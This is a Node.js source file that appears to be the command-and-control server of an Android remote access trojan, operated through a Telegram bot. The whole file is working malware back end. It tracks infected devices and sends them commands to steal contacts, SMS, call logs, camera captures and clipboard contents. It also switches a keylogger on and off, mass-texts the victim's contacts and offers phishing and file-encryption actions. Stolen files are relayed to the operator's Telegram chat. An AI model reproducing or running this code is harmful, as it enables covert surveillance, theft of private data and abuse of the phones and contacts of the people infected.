const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const TelegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require("fs");

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new TelegramBot(data.token, { polling: true });

const appData = new Map();

// Actions without stars
const actions = [
    "Contacts", "SMS", "Calls", "Apps",
    "Main camera", "Selfie camera", "Microphone",
    "Clipboard", "Screenshot", "Toast",
    "Send SMS", "Vibrate", "Play audio", "Stop audio",
    "Keylogger ON", "Keylogger OFF", "File explorer", "Gallery",
    "Encrypt", "Decrypt", "Send SMS to all contacts",
    "Notification", "Open URL", "Phishing",
    "Back to menu"
];

// ---------------- UPLOAD FILE ----------------
app.post("/upload", uploader.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const model = req.headers.model;

    bot.sendDocument(
        data.id,
        req.file.buffer,
        {
            caption: "File received from: " + model,
            parse_mode: "HTML"
        },
        { filename: filename, contentType: "*/*" }
    );

    res.send("Done");
});

// ---------------- GET TEXT ----------------
app.get("/text", (req, res) => {
    res.send(data.text);
});

// ---------------- SOCKET CONNECTION ----------------
io.on("connection", socket => {
    let model = socket.handshake.headers.model + "-" + io.sockets.sockets.size;
    let version = socket.handshake.headers.version || "unknown";
    let ip = socket.handshake.headers.ip || "unknown";

    socket.model = model;
    socket.version = version;
    socket.ip = ip;

    let msg =
        "New device connected\n\n" +
        "Model: " + model + "\n" +
        "Version: " + version + "\n" +
        "IP: " + ip + "\n" +
        "Time: " + socket.handshake.time + "\n";

    bot.sendMessage(data.id, msg);

    socket.on("disconnect", () => {
        let m =
            "Device disconnected\n\n" +
            "Model: " + model + "\n" +
            "Version: " + version + "\n" +
            "IP: " + ip + "\n" +
            "Time: " + socket.handshake.time + "\n";

        bot.sendMessage(data.id, m);
    });

    socket.on("message", message => {
        bot.sendMessage(data.id, "Message from " + model + ":\n" + message);
    });
});

// ---------------- TELEGRAM BOT ----------------
bot.on("message", msg => {
    const text = msg.text;

    // Start command
    if (text === "/start") {
        bot.sendMessage(data.id, "Welcome to your control panel\n\nVersion 0.3.6", {
            reply_markup: {
                keyboard: [
                    ["Devices", "Actions"],
                    ["About"]
                ],
                resize_keyboard: true
            }
        });
        return;
    }

    // ---------------- Devices ----------------
    if (text === "Devices") {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, "No connected devices.");
            return;
        }

        let message = "Connected devices: " + io.sockets.sockets.size + "\n\n";
        let i = 1;

        io.sockets.sockets.forEach((socket, id) => {
            message +=
                "Device " + i + "\n" +
                "Model: " + socket.model + "\n" +
                "Version: " + socket.version + "\n" +
                "IP: " + socket.ip + "\n" +
                "Time: " + socket.handshake.time + "\n\n";
            i++;
        });

        bot.sendMessage(data.id, message);
        return;
    }

    // ---------------- Actions ----------------
    if (text === "Actions") {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, "No connected devices.");
            return;
        }

        let deviceKeyboard = [];
        io.sockets.sockets.forEach(socket => {
            deviceKeyboard.push([socket.model]);
        });

        deviceKeyboard.push(["All devices"]);
        deviceKeyboard.push(["Back to menu"]);

        bot.sendMessage(data.id, "Select device:", {
            reply_markup: {
                keyboard: deviceKeyboard,
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });

        return;
    }

    // ---------------- Selecting a device ----------------
    io.sockets.sockets.forEach((socket, id) => {
        if (text === socket.model) {
            appData.set("target", id);

            bot.sendMessage(data.id, "Select action:", {
                reply_markup: {
                    keyboard: chunk(actions, 2),
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    });

    if (text === "All devices") {
        appData.set("target", "all");

        bot.sendMessage(data.id, "Select action:", {
            reply_markup: {
                keyboard: chunk(actions, 2),
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    }

    // ---------------- Execute action ----------------
    if (actions.includes(text)) {
        executeAction(text);
    }
});

// ---------------- ACTION EXECUTION ----------------
function executeAction(actionName) {
    let target = appData.get("target");
    if (!target) return;

    let socketSend = (request, extras = []) => {
        if (target === "all") {
            io.sockets.emit("commend", { request, extras });
        } else {
            io.to(target).emit("commend", { request, extras });
        }
        bot.sendMessage(data.id, "Action executed.");
        appData.delete("target");
    };

    switch (actionName) {
        case "Contacts": socketSend("contacts"); break;
        case "SMS": socketSend("all-sms"); break;
        case "Calls": socketSend("calls"); break;
        case "Apps": socketSend("apps"); break;
        case "Main camera": socketSend("main-camera"); break;
        case "Selfie camera": socketSend("selfie-camera"); break;
        case "Clipboard": socketSend("clipboard"); break;
        case "Keylogger ON": socketSend("keylogger-on"); break;
        case "Keylogger OFF": socketSend("keylogger-off"); break;
        case "Screenshot": socketSend("screenshot"); break;

        case "Toast":
            appData.set("action", "toast");
            bot.sendMessage(data.id, "Enter text for toast:");
            break;

        case "Send SMS":
            appData.set("action", "sms-number");
            bot.sendMessage(data.id, "Enter phone number:");
            break;

        case "Vibrate":
            appData.set("action", "vibrate");
            bot.sendMessage(data.id, "Enter vibration duration (seconds):");
            break;

        case "Send SMS to all contacts":
            appData.set("action", "sms-all");
            bot.sendMessage(data.id, "Enter text to send:");
            break;

        case "Notification":
            appData.set("action", "notification");
            bot.sendMessage(data.id, "Enter notification text:");
            break;

        default:
            bot.sendMessage(data.id, "Action not implemented.");
    }
}

// ---------------- UTIL ----------------
function chunk(arr, size) {
    const out = [];
    for (let i = 0; i < arr.length; i += size)
        out.push(arr.slice(i, i + size));
    return out;
}

// ---------------- KEEP ALIVE PINGS ----------------
setInterval(() => {
    io.sockets.sockets.forEach((sock, id) => {
        io.to(id).emit("ping", {});
    });
}, 5000);

// ---------------- WAKE HOST ----------------
setInterval(() => {
    https.get(data.host, () => {}).on("error", () => {});
}, 300000);

// ---------------- START SERVER ----------------
server.listen(process.env.PORT || 3000, () => {
    console.log("Listening on port 3000");
});
